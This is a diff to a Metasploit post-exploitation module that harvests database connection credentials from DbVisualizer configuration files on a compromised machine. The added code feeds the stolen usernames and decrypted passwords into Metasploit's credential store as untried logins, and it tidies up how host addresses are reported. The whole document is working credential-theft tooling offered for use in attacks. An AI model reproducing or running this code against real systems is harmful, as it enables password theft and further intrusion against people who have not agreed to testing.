@@ -149,7 +149,7 @@ class Metasploit3 < Msf::Post
           db[:Namespace] = "";
         end
         # save
-        dbs << db if (db[:Alias] and db[:Type] and  db[:Server] and db[:Port] )
+        dbs << db if (db[:Alias] and db[:Type] and db[:Server] and db[:Port])
         db = {}
       end
 
@@ -205,6 +205,13 @@ class Metasploit3 < Msf::Post
       end
 
       db_table << [ db[:Alias], db[:Type], db[:Server], db[:Port], db[:Database], db[:Namespace], db[:UserID], db[:Password] ]
+      report_cred(
+        ip: db[:Server],
+        port: db[:Port].to_i,
+        service_name: db[:Type],
+        username: db[:UserID],
+        password: db[:Password]
+      )
     end
     return db_table
   end
@@ -278,12 +285,20 @@ class Metasploit3 < Msf::Post
     # Fill the tab
     dbs.each do |db|
       if (db[:URL] =~ /[\S+\s+]+[\/]+([\S+\s+]+):[\S+]+/i)
-        if ::Rex::Socket.is_ipv4?($1.to_s)
-          print_good("Reporting #{$1}")
-          report_host(:host => $1.to_s)
+        server = $1
+        if ::Rex::Socket.is_ipv4?(server)
+          print_good("Reporting #{server}")
+          report_host(:host => server)
         end
       end
       db_table << [ db[:Alias] , db[:Type] , db[:URL], db[:UserID], db[:Password] ]
+      report_cred(
+        ip: server,
+        port: '',
+        service_name: db[:Type],
+        username: db[:UserID],
+        password: db[:Password]
+      )
     end
     return db_table
   end
@@ -295,6 +310,32 @@ class Metasploit3 < Msf::Post
       print_good("DbVisualizer version: #{$1}")
     end
     found
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:username]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def decrypt_password(enc_password)
